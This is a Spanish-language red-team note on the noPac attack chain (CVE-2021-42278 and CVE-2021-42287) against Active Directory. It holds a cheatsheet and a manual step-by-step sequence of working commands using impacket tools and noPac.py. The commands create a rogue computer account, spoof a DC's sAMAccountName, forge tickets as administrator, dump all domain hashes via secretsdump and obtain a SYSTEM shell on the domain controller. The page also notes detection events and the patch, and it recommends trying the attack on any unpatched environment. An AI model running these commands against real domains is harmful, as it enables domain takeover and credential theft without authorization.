---
aliases:
  - noPac
  - sAMAccountName Spoofing
  - SamAccountName Spoofing
  - CVE-2021-42278
  - CVE-2021-42287
  - sam-the-admin
tags:
  - technique/privilege-escalation
  - technique/kerberos
  - asset/active-directory
  - env/windows
  - vuln/ad-enumeration
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Technique
linked:
  - "[[Constrained Delegation (S4U)]]"
  - "[[Silver Ticket]]"
  - "[[AD - Security Controls Enumeration]]"
---
# noPac (sAMAccountName Spoofing)

Cadena de dos CVEs (Nov 2021) que escala de **usuario de dominio común → Domain Admin** en un solo paso:

- **CVE-2021-42278** — el AD no forzaba que las computer accounts terminaran en `$`. Se puede renombrar una máquina al nombre de un DC (sin `$`).
- **CVE-2021-42287** — si el KDC no encuentra el nombre del TGS, hace fallback agregando `$` y resuelve al **DC real**. Combinadas: pedís un TGT como "DC01", borrás/renombrás tu cuenta, y el KDC te da un TGS **como DC01$** (DA-equivalente).

Requisito: poder crear una computer account → `ms-DS-MachineAccountQuota > 0` (default 10). Ver [[AD - Security Controls Enumeration]].

---

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `nxc ldap $DC -u U -p P -M maq` | `MachineAccountQuota` (¿podés crear máquina?) | Pre-check obligatorio. |
| `nxc smb $DC -u U -p P -M nopac` | Chequea si el DC es vulnerable (sin parche KB5008380) | Detección rápida. |
| `impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Pass123' -dc-host $DC 'corp.local/U:P'` | Crear la computer account de ataque | Si MAQ lo permite. |
| `python3 noPac.py corp.local/U:P -dc-ip $IP -dc-host DC01 --impersonate administrator -use-ldap` | TGS como `administrator` vía la cadena completa (auto) | Explotación one-shot. |
| `python3 noPac.py ... --impersonate administrator -dump` | Dispara **secretsdump** (DCSync) con el ticket obtenido | Dump de hashes del dominio directo. |
| `python3 noPac.py ... -shell` | Shell SMB como SYSTEM en el DC | RCE inmediata. |
| `sam_the_admin.py 'corp.local/U:P' -dc-ip $IP -shell` | Variante sam-the-admin (mismo bug) | Alternativa a noPac.py. |

```bash
# Cadena manual (entender el flujo)
# 1. Crear máquina
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'P@ss' 'corp.local/U:P' -dc-ip $IP
# 2. Renombrar sAMAccountName al nombre del DC SIN el $
impacket-renameMachine -current-name 'EVIL$' -new-name 'DC01' 'corp.local/U:P'
# 3. Pedir TGT como "DC01"
impacket-getTGT 'corp.local/DC01:P@ss' -dc-ip $IP
# 4. Renombrar la máquina de vuelta (para que el KDC haga fallback a DC01$)
impacket-renameMachine -current-name 'DC01' -new-name 'EVIL$' 'corp.local/U:P'
# 5. S4U2self con el TGT → TGS como administrator hacia DC01$
KRB5CCNAME=DC01.ccache impacket-getST -self -impersonate administrator -spn 'cifs/DC01.corp.local' 'corp.local/DC01' -dc-ip $IP
# 6. Usar el ticket
KRB5CCNAME=administrator.ccache impacket-secretsdump -k -no-pass DC01.corp.local
```

---

## Overview

Es de las escaladas más limpias: **un usuario de dominio sin privilegios → control del DC** sin tocar ACLs ni esperar a un DA. El único requisito real es `MachineAccountQuota > 0` (default) y un DC sin el parche de noviembre 2021.

**Detección/defensa:** parche **KB5008380** + monitorear cambios de `sAMAccountName` en computer accounts (Event 4662, 4781) y creación de máquinas (4741). Poner `MachineAccountQuota = 0` corta el vector de creación (aunque sirve cualquier máquina ya controlada).

> [!warning] Parche
> Mitigado desde KB5008380/KB5008602. Sigue siendo oro en entornos sin actualizar — probar siempre que MAQ lo permita.

---

## Recursos

- [Cube0x0/noPac](https://github.com/cube0x0/noPac) — exploit principal.
- [WazeHell/sam-the-admin](https://github.com/WazeHell/sam-the-admin) — variante original.
- [Microsoft KB5008380](https://support.microsoft.com/topic/kb5008380) — parche.
